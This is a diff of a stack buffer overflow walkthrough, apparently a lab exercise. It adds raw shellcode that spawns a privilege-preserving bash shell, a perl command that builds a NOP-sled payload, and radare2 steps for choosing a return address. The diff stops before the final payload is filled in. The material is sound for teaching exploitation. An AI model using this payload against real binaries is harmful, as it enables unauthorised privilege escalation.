@@ -75,4 +75,39 @@ ood
 dc
 ```
 * we now see that the crash message includes the value `0x42424242`, which is ASCII hex for the `B` characters
-* 
+* now that we've confirmed the offset for the payload, we can sneak some shellcode into the payload, then return a memory address before the payload in the `eip`
+* for our shellcode, we'll use one from this website: https://shell-storm.org/shellcode/files/shellcode-606.html
+* this is the shellcode:
+```
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
+```
+* the length of the shellcode is `33` bytes
+* for our payload, we'll subtract `33` from our offset, and change the offset value from `A` to `\x90`, which is a NOP (no operation) character
+* our intended payload will be
+```
+ 231 NOP bytes
+  33 shellcode bytes
+   4 return address bytes
+------
+ 267 total bytes
+```
+* we'll use the following command to create the correct contents for the `payload` file
+```Bash
+perl -e 'print "\x90" x 231 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "B" x 4' > payload
+```
+* note that we're still using a placeholder for the `eip` conents, since we don't know which memory address we want to jump to with `eip`
+* run the binary with the new payload in `r2`
+```
+ood
+dc
+```
+* we see that the contents of `eip` is still `0x42424242`, which means that we have the correct length of payload
+* next, we'll take a look at `60` bytes behind the `esp` to see if we can find a memory address to return to
+```
+px @ esp-60
+```
+* we see that memory address `0xffffdce4` is located close to the shellcode, and since the contents of that address is NOP bytes, the program execution should ride the NOP sled and straight into our shell code
+* the final adjustment to the `payload` file is this:
+```
+
+```
